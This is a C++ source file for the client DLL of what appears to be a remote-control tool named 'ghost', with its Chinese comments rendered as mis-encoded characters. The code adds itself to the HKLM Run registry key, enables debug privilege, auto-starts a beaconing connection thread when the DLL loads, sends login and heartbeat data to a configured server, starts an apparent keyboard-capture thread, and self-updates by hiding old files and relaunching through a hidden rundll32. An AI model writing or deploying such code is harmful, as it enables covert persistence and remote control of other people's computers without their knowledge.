// ClientDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "ClientDll.h"

// �Զ�����ע����е�ֵ
#define REG_NAME "a_ghost"

// �����Ŀͻ��˸���
#define CLIENT_PARALLEL_NUM 1

// Զ�̵�ַ
CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION};

// ���տͻ���ֻ��2��ȫ�ֱ���: g_SETTINGS��g_MyApp����g_SETTINGS��Ϊg_MyApp�ĳ�Ա.
// ���ȫ������ֻ��һ��ȫ�ֱ���: g_MyApp
ClientApp g_MyApp(&g_SETTINGS, IsClientAppRunning);

enum { E_RUN, E_STOP, E_EXIT } status;

int ClientApp::m_nCount = 0;

CLock ClientApp::m_Locker;

BOOL IsProcessExit() {
	return g_MyApp.g_bExit == S_CLIENT_EXIT;
}

BOOL IsSharedRunning(void* thisApp) {
	ClientApp* This = (ClientApp*)thisApp;
	return (S_CLIENT_NORMAL == g_MyApp.g_bExit) && (S_CLIENT_NORMAL == This->g_bExit);
}

BOOL IsClientAppRunning(void* thisApp) {
	ClientApp* This = (ClientApp*)thisApp;
	return S_CLIENT_NORMAL == This->g_bExit;
}

ClientApp* NewClientStartArg(const char* remoteAddr, IsRunning run, BOOL shared) {
	auto v = StringToVector(remoteAddr, ':', 2);
	if (v[0].empty() || v[1].empty())
		return nullptr;
	auto a = new ClientApp(g_MyApp.g_Connection, run, shared);
	a->g_Connection->SetServer(v[0].c_str(), atoi(v[1].c_str()));
	return a;
}

DWORD WINAPI StartClientApp(LPVOID param) {
	ClientApp::AddCount(1);
	ClientApp* app = (ClientApp*)param;
	CONNECT_ADDRESS& settings(*(app->g_Connection));
	const char* ip = settings.ServerIP();
	int port = settings.ServerPort();
	State& bExit(app->g_bExit);
	if (ip != NULL && port > 0)
	{
		settings.SetServer(ip, port);
	}
	if (strlen(settings.ServerIP()) == 0 || settings.ServerPort() <= 0) {
		Mprintf("��������: ���ṩԶ������IP�Ͷ˿�!\n");
		Sleep(3000);
	} else {
		app->g_hInstance = GetModuleHandle(NULL);
		Mprintf("[ClientApp: %d] Total [%d] %s:%d \n", app->m_ID, app->GetCount(), settings.ServerIP(), settings.ServerPort());

		do {
			bExit = S_CLIENT_NORMAL;
			HANDLE hThread = CreateThread(NULL, 0, StartClient, app, 0, NULL);

			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			if (IsProcessExit()) // process exit
				break;
		} while (E_RUN == status && S_CLIENT_EXIT != bExit);
	}

	auto r = app->m_ID;
	if (app != &g_MyApp) delete app;
	ClientApp::AddCount(-1);

	return r;
}

/**
 * @brief �ȴ���������֧�ֳ���MAXIMUM_WAIT_OBJECTS���ƣ�
 * @param handles �������
 * @param waitAll �Ƿ�ȴ����о����ɣ�TRUE=ȫ��, FALSE=����һ����
 * @param timeout ��ʱʱ�䣨���룬INFINITE��ʾ���޵ȴ���
 * @return �ȴ������WAIT_OBJECT_0�ɹ�, WAIT_FAILEDʧ�ܣ�
 */
DWORD WaitForMultipleHandlesEx(
	const std::vector<HANDLE>& handles,
	BOOL waitAll = TRUE,
	DWORD timeout = INFINITE
) {
	const DWORD MAX_WAIT = MAXIMUM_WAIT_OBJECTS; // ϵͳ���ƣ�64��
	DWORD totalHandles = static_cast<DWORD>(handles.size());

	// 1. �������Ч��
	for (HANDLE h : handles) {
		if (h == NULL || h == INVALID_HANDLE_VALUE) {
			SetLastError(ERROR_INVALID_HANDLE);
			return WAIT_FAILED;
		}
	}

	// 2. ����������64��ֱ�ӵ���ԭ��API
	if (totalHandles <= MAX_WAIT) {
		return WaitForMultipleObjects(totalHandles, handles.data(), waitAll, timeout);
	}

	// 3. �����ȴ��߼�
	if (waitAll) {
		// ����ȴ����о�����
		for (DWORD i = 0; i < totalHandles; i += MAX_WAIT) {
			DWORD batchSize = min(MAX_WAIT, totalHandles - i);
			DWORD result = WaitForMultipleObjects(
				batchSize,
				&handles[i],
				TRUE,  // ����ȴ���ǰ����ȫ�����
				timeout
			);
			if (result == WAIT_FAILED) {
				return WAIT_FAILED;
			}
		}
		return WAIT_OBJECT_0;
	}
	else {
		// ֻ��ȴ�����һ��������
		while (true) {
			for (DWORD i = 0; i < totalHandles; i += MAX_WAIT) {
				DWORD batchSize = min(MAX_WAIT, totalHandles - i);
				DWORD result = WaitForMultipleObjects(
					batchSize,
					&handles[i],
					FALSE,  // ��ǰ��������һ����ɼ���
					timeout
				);
				if (result != WAIT_FAILED && result != WAIT_TIMEOUT) {
					return result + i; // ����ȫ������
				}
			}
			if (timeout != INFINITE) {
				return WAIT_TIMEOUT;
			}
		}
	}
}

#if _CONSOLE

//����Ȩ��
void DebugPrivilege()
{
	HANDLE hToken = NULL;
	//�򿪵�ǰ���̵ķ�������
	int hRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);

	if (hRet)
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		//ȡ������Ȩ�޵�LUID
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		//�����������Ƶ�Ȩ��
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

		CloseHandle(hToken);
	}
}

/**
* @brief ���ñ�����������
* @param[in] *sPath ע����·��
* @param[in] *sNmae ע���������
* @return ����ע����
* @details Win7 64λ�����ϲ��Խ��������ע�����ڣ�\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note �״�������Ҫ�Թ���ԱȨ�����У�������ע���д�뿪��������
*/
BOOL SetSelfStart(const char* sPath, const char* sNmae)
{
	DebugPrivilege();

	// д���ע���·��
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// ��ע�����д��������Ϣ
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// �ж��Ƿ�ɹ�
	if (lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// �ر�ע���
	RegCloseKey(hKey);

	// �ж��Ƿ�ɹ�
	return lRet == ERROR_SUCCESS;
}

// ���ؿ���̨
// �ο���https://blog.csdn.net/lijia11080117/article/details/44916647
// step1: ��������"�߼�"������ڵ�ΪmainCRTStartup
// step2: ��������"ϵͳ"����ϵͳΪ����
// ���

BOOL CALLBACK callback(DWORD CtrlType)
{
	if (CtrlType == CTRL_CLOSE_EVENT)
	{
		g_MyApp.g_bExit = S_CLIENT_EXIT;
		while (E_RUN == status)
			Sleep(20);
	}
	return TRUE;
}

int main(int argc, const char *argv[])
{
	if (!SetSelfStart(argv[0], REG_NAME))
	{
		Mprintf("���ÿ���������ʧ�ܣ����ù���ԱȨ������.\n");
	}

	status = E_RUN;

	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, "ghost.exe");
	if (ERROR_ALREADY_EXISTS == GetLastError())
	{
		CloseHandle(hMutex);
		return -2;
	}
	
	SetConsoleCtrlHandler(&callback, TRUE);
	const char* ip = argc > 1 ? argv[1] : NULL;
	int port = argc > 2 ? atoi(argv[2]) : 0;
	ClientApp& app(g_MyApp);
	app.g_Connection->SetType(CLIENT_TYPE_ONE);
	app.g_Connection->SetServer(ip, port);
	if (CLIENT_PARALLEL_NUM == 1) {
		// ���������ͻ���
		StartClientApp(&app);
	} else {
		std::vector<HANDLE> handles(CLIENT_PARALLEL_NUM);
		for (int i = 0; i < CLIENT_PARALLEL_NUM; i++) {
			auto client = new ClientApp(app.g_Connection, IsSharedRunning, FALSE);
			handles[i] = CreateThread(0, 64*1024, StartClientApp, client->SetID(i), 0, 0);
			if (handles[i] == 0) {
				Mprintf("�߳� %d ����ʧ�ܣ�����: %d\n", i, errno);
			}
		}
		DWORD result = WaitForMultipleHandlesEx(handles, TRUE, INFINITE);
		if (result == WAIT_FAILED) {
			Mprintf("WaitForMultipleObjects ʧ�ܣ��������: %d\n", GetLastError());
		}
	}
	ClientApp::Wait();
	status = E_STOP;

	CloseHandle(hMutex);
	Logger::getInstance().stop();

	return 0;
}
#else

extern "C" __declspec(dllexport) void TestRun(char* szServerIP, int uPort);

// Auto run main thread after load the DLL
DWORD WINAPI AutoRun(LPVOID param) {
	do
	{
		TestRun(NULL, 0);
	} while (S_SERVER_EXIT == g_MyApp.g_bExit);

	if (g_MyApp.g_Connection->ClientType() == CLIENT_TYPE_SHELLCODE) {
		HMODULE hInstance = (HMODULE)param;
		FreeLibraryAndExitThread(hInstance, -1);
	}

	return 0;
}

BOOL APIENTRY DllMain( HINSTANCE hInstance, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			g_MyApp.g_hInstance = (HINSTANCE)hInstance;
			CloseHandle(CreateThread(NULL, 0, AutoRun, hInstance, 0, NULL));
			break;
		}
	case DLL_PROCESS_DETACH:
		g_MyApp.g_bExit = S_CLIENT_EXIT;
		break;
	}
	return TRUE;
}

// ��������һ��ghost
extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
{
	ClientApp& app(g_MyApp);
	CONNECT_ADDRESS& settings(*(app.g_Connection));
	if (app.IsThreadRun()) {
		settings.SetServer(szServerIP, uPort);
		return;
	}
	app.SetThreadRun(TRUE);
	app.SetProcessState(S_CLIENT_NORMAL);
	settings.SetServer(szServerIP, uPort);
	
	HANDLE hThread = CreateThread(NULL,0,StartClient, &app,0,NULL);
	if (hThread == NULL) {
		app.SetThreadRun(FALSE);
		return;
	}
#ifdef _DEBUG
	WaitForSingleObject(hThread, INFINITE);
#else
	WaitForSingleObject(hThread, INFINITE);
#endif
	CloseHandle(hThread);
}

// ֹͣ����
extern "C" __declspec(dllexport) void StopRun() { g_MyApp.g_bExit = S_CLIENT_EXIT; }

// �Ƿ�ɹ�ֹͣ
extern "C" __declspec(dllexport) bool IsStoped() { return g_MyApp.g_bThreadExit && ClientApp::GetCount() == 0; }

// �Ƿ��˳��ͻ���
extern "C" __declspec(dllexport) BOOL IsExit() { return g_MyApp.g_bExit; }

// �����д˳��������κβ���
extern "C" __declspec(dllexport) int EasyRun() {
	ClientApp& app(g_MyApp);
	CONNECT_ADDRESS& settings(*(app.g_Connection));

	do {
		TestRun((char*)settings.ServerIP(), settings.ServerPort());
		while (!IsStoped())
			Sleep(50);
		if (S_CLIENT_EXIT == app.g_bExit) // �ܿض��˳�
			break;
		else if (S_SERVER_EXIT == app.g_bExit)
			continue;
		else // S_CLIENT_UPDATE: �������
			break;
	} while (true);

	return app.g_bExit;
}

// copy from: SimpleRemoter\client\test.cpp
// �����µ�DLL
void RunNewDll(const char* cmdLine) {
	char path[_MAX_PATH], * p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	*(p + 1) = 0;
	std::string folder = path;
	std::string oldFile = folder + "ServerDll.old";
	std::string newFile = folder + "ServerDll.new";
	strcpy(p + 1, "ServerDll.dll");
	BOOL ok = TRUE;
	if (_access(newFile.c_str(), 0) != -1) {
		if (_access(oldFile.c_str(), 0) != -1)
		{
			if (!DeleteFileA(oldFile.c_str()))
			{
				Mprintf("Error deleting file. Error code: %d\n", GetLastError());
				ok = FALSE;
			}
		}
		if (ok && !MoveFileA(path, oldFile.c_str())) {
			Mprintf("Error removing file. Error code: %d\n", GetLastError());
			if (_access(path, 0) != -1)
			{
				ok = FALSE;
			}
		}
		else {
			// �����ļ�����Ϊ����
			if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN))
			{
				Mprintf("File created and set to hidden: %s\n", oldFile.c_str());
			}
		}
		if (ok && !MoveFileA(newFile.c_str(), path)) {
			Mprintf("Error removing file. Error code: %d\n", GetLastError());
			MoveFileA(oldFile.c_str(), path);// recover
		}
		else if (ok) {
			Mprintf("Using new file: %s\n", newFile.c_str());
		}
	}
	char cmd[1024];
	sprintf_s(cmd, "%s,Run %s", path, cmdLine);
	ShellExecuteA(NULL, "open", "rundll32.exe", cmd, NULL, SW_HIDE);
}

/* ���пͻ��˵ĺ��Ĵ���. ��Ϊ���嵼������, ���� rundll32 ����Լ��.
HWND hwnd: �����ھ����ͨ��Ϊ NULL����
HINSTANCE hinst: DLL ��ʵ�������
LPSTR lpszCmdLine: �����в�������Ϊ�ַ������ݸ�������
int nCmdShow: ������ʾ״̬��
�������rundll32.exe ClientDemo.dll,Run 127.0.0.1:6543
���ȴ������в����ж�ȡ������ַ�������ָ�������ʹ�ȫ�ֱ�����ȡ��
*/
extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
	ClientApp& app(g_MyApp);
	CONNECT_ADDRESS& settings(*(app.g_Connection));
	State& bExit(app.g_bExit);
	char message[256] = { 0 };
	if (strlen(lpszCmdLine) != 0) {
		strcpy_s(message, lpszCmdLine);
	}else if (settings.IsValid())
	{
		sprintf_s(message, "%s:%d", settings.ServerIP(), settings.ServerPort());
	}

	std::istringstream stream(message);
	std::string item;
	std::vector<std::string> result;
	while (std::getline(stream, item, ':')) {
		result.push_back(item);
	}
	if (result.size() == 1)
	{
		result.push_back("80");
	}
	if (result.size() != 2) {
		MessageBox(hwnd, "���ṩ��ȷ��������ַ!", "��ʾ", MB_OK);
		return;
	}
	
	do {
		TestRun((char*)result[0].c_str(), atoi(result[1].c_str()));
		while (!IsStoped())
			Sleep(20);
		if (bExit == S_CLIENT_EXIT)
			return;
		else if (bExit == S_SERVER_EXIT)
			continue;
		else // S_CLIENT_UPDATE
			break;
	} while (true);

	sprintf_s(message, "%s:%d", settings.ServerIP(), settings.ServerPort());
	RunNewDll(message);
}

#endif

DWORD WINAPI StartClient(LPVOID lParam)
{
	ClientApp& app(*(ClientApp*)lParam);
	CONNECT_ADDRESS& settings(*(app.g_Connection));
	auto list = app.GetSharedMasterList();
	if (list.size() > 1 && settings.runningType == RUNNING_PARALLEL) {
		for (int i=1; i<list.size(); ++i){
			std::string addr = list[i] + ":" + std::to_string(settings.ServerPort());
			auto a = NewClientStartArg(addr.c_str(), IsSharedRunning, TRUE);
			if (nullptr != a) CloseHandle(CreateThread(0, 0, StartClientApp, a, 0, 0));
		}
		// The main ClientApp.
		settings.SetServer(list[0].c_str(), settings.ServerPort());
	}
	State& bExit(app.g_bExit);
	IOCPClient  *ClientObject = new IOCPClient(bExit);
	CKernelManager* Manager = nullptr;

	if (!app.m_bShared) {
		if (NULL == app.g_hEvent) {
			app.g_hEvent = CreateEventA(NULL, TRUE, FALSE, EVENT_FINISHED);
		}
		if (app.g_hEvent == NULL) {
			Mprintf("[StartClient] Failed to create event: %s! %d.\n", EVENT_FINISHED, GetLastError());
		}
	}

	app.SetThreadRun(TRUE);
	ThreadInfo* kb = CreateKB(&settings, bExit);
	while (app.m_bIsRunning(&app))
	{
		ULONGLONG dwTickCount = GetTickCount64();
		if (!ClientObject->ConnectServer(settings.ServerIP(), settings.ServerPort()))
		{
			for (int k = 500; app.m_bIsRunning(&app) && --k; Sleep(10));
			continue;
		}
		SAFE_DELETE(Manager);
		Manager = new CKernelManager(&settings, ClientObject, app.g_hInstance, kb);

		//׼����һ������
		LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings);
		ClientObject->SendLoginInfo(login);

		do 
		{
			Manager->SendHeartbeat();
		} while (ClientObject->IsRunning() && ClientObject->IsConnected() && app.m_bIsRunning(&app));
		while (GetTickCount64() - dwTickCount < 5000 && app.m_bIsRunning(&app))
			Sleep(200);
	}
	kb->Exit(10);
	if (app.g_bExit == S_CLIENT_EXIT && app.g_hEvent && !app.m_bShared) {
		BOOL b = SetEvent(app.g_hEvent);
		Mprintf(">>> [StartClient] Set event: %s %s!\n", EVENT_FINISHED, b ? "succeed" : "failed");

		CloseHandle(app.g_hEvent);
		app.g_hEvent = NULL;
	}

	Mprintf("StartClient end\n");
	delete ClientObject;
	SAFE_DELETE(Manager);
	app.SetThreadRun(FALSE);

	return 0;
} 
